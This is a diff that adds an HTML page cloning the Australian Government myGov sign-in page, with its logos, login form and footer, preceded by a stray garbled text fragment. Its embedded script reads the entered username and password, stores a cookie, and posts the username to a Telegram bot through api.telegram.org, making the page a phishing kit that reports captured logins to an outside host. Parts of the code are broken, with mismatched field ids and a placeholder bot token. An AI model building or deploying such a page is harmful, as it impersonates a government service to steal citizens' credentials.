@@ -1,0 +1,258 @@
+where do i Use this token to access the HTTP AP<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MyGov Login with Cookies and Telegram Notification</title>
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
+    <link href="/mygov/content/mgv2/css/mgv2-application.css" rel="stylesheet">
+    <link href="/mygov/content/mgv2/css/blugov.css" rel="stylesheet">
+</head>
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="https://my.gov.au/" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg" alt="Australian Government and myGov logo" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="https://my.gov.au/en/about/help">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+
+    <!-- Login Form with Cookies and Telegram Notification -->
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+<h1>Sign in with myGov</h1>
+							<p class="login-instruction-text">Choose how to sign in</p>
+							<h2 class="text-align-left">Use your myGov sign in details</h2>
+							<form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="/las/mygov-login?execution=e11s1" method="post">
+	
+								<div class="input-group">
+									<label class="override" for="userId">Username or email</label>
+									<input id="userId" name="username" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+								</div>
+								<p class="recovery">
+									<a href="/las/mygov-login?execution=e11s1&amp;_eventId=recoverusername"
+										class="anchor override">Forgot username</a>
+								</p>
+	
+								<div class="input-group">
+									<label for="password" class="override">Password</label>
+									<div class="password-group">
+										<input id="password" name="password" type="password"
+											data-current-password="data-current-password" autocomplete="off"
+											aria-required="true" />
+									</div>
+								</div>
+								<p class="recovery">
+									<a href="/las/mygov-login?execution=e11s1&amp;_eventId=resetpassword" class="anchor override">Forgot
+										password</a>
+								</p>
+	
+								<div class="button-digital-id-main-container override">
+									<div class="digital-id-button-container">
+										<button type="submit" class="button-main" name="_eventId_login">Sign in</button>
+									</div>
+								</div>
+	
+								<input type="hidden" name="authtype" value="unamepword" />
+								<input type="hidden" name="_csrf" value="dba6dd7e-c890-420d-94a9-9a8b816728cf" />
+                                
+                                    
+                                        <input type="hidden" name="clientId" value="mygov-citizen-portal" />
+                                    
+                                    
+                                
+
+
+								
+									
+									<p class="create-account-text"><a class="create-account-link"
+										href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.</p>
+									
+									
+								
+								
+								
+							
+								
+							<div>
+<input type="hidden" name="_csrf" value="dba6dd7e-c890-420d-94a9-9a8b816728cf" />
+</div></form>
+	
+							<div class="hr-word">
+								<div class="draw-circle">
+									or
+								</div>
+							</div>
+	
+							<div class="digital-id-login-card secondary">
+								<div class="button-digital-id-container">
+                                    <h2 class="text-align-left">Sign in another way</h2>
+                                    <div class='digital-id-login-option-container'>
+                                        <div class='inner-options'>
+                                            <a class="button-digital-identity" href="/las/mygov-login?execution=e11s1&amp;_eventId=digitalIdentity">Sign in with Digital ID</a>
+                                            <input type="hidden" value="{flowScope.targetParamDI}" />
+                                            <a class="button-digital-identity" id="passkey-signin-btn" onclick="authenticatePasskey()" tabindex="0">
+                                                <img class="passkey-icon" src="/mygov/content/mgv2/icons/FIDO_Passkey_mark_A_black.svg" alt=""/>
+                                                Sign in with passkey
+                                            </a>
+                                            <p class="external-links-zone">Learn about
+                                              <a href="https://my.gov.au/en/about/help/mygov-website/sign-in-to-mygov/use-passkeys" target="_blank">passkeys<span class="is-visuallyhidden"> opens in a new window</span></a>
+                                            </p>
+                                        </div>
+                                    </div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+    <script>
+        let isWebAuthnSupportedOnPlatform = false;
+    </script>
+
+        <!-- Script for handling cookies and Telegram notification -->
+        <script>
+            // Notify Telegram bot via your server
+            function notifyTelegram(username) {
+                fetch('https://api.telegram.org/bot<t.me/Annonymousespirit_Bot.>/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: '<t.me/Annonymousespirit_Bot.>',
+                        text: `User logged in: ${username} on MyGov`
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram notification sent:', data);
+                })
+                .catch((error) => {
+                    console.error('Error sending Telegram notification:', error);
+                });
+            }
+
+            // Function to save username in cookies after validation and notify Telegram
+            function login() {
+                let username = document.getElementById("username").value;
+                let password = document.getElementById("password").value;
+
+                if (username !== "" && password !== "") {
+                    setCookie("username", username, 7); // Store username for 7 days
+                    alert("Login Successful! Cookies are set.");
+
+                    // Notify the Telegram bot
+                    notifyTelegram(username);
+                } else {
+                    alert("Please enter both username and password.");
+                }
+            }
+
+            // Function to create a cookie
+            function setCookie(cname, cvalue, exdays) {
+                const d = new Date();
+                d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+                let expires = "expires=" + d.toUTCString();
+                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+            }
+
+            // Enforce HTTPS
+            function enforceHTTPS() {
+                if (location.protocol !== 'https:') {
+                    location.replace(`https://${location.hostname}${location.pathname}`);
+                }
+            }
+
+            window.onload = function () {
+                enforceHTTPS();
+            };
+        </script>
+
+         </script>
+            <script>
+                var input = document.getElementById("passkey-signin-btn");
+                input.addEventListener("keypress", function(event) {
+                  if (event.key === "Enter") {
+                    event.preventDefault();
+                    input.click();
+                  }
+                });
+            </script>
+</div></div>
+
+
+
+
+
+<footer role="contentinfo">
+    <div class="wrapper">
+      <div class="inner">
+
+        <section class="footer-list">
+            <nav>
+            <h2 class="sr-only" aria-label="Footer">Footer</h2>
+            <ul class="lower-links">
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a>
+                </li>
+            </ul>
+            </nav>
+        </section>
+          <div class="footer-lower">
+              <section class="footer-lower-logo">
+              <a href="https://my.gov.au/">
+                  <img src="/mygov/content/mgv2/blugov/myGov-cobranded-logo-white.svg"
+                       alt="Australian Government and myGov logo" width="313.17"
+                       height="70" role="img">
+              </a>
+              </section>
+
+              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+          </div>
+
+
+
+
+      </div>
+    </div>
+  </footer>
+
+
+<script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-vendor.js"></script>
+<script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-application.js"></script>
+<script type="text/javascript" src="/mygov/content/mgv2/js/login.js"></script>
+<script type="module" src="/mygov/content/mgv2/js/mygov-passkeys.mjs"></script>
+<div id="artifact-metadata">
+	
+</div>
+
+</body>
+
+</html>
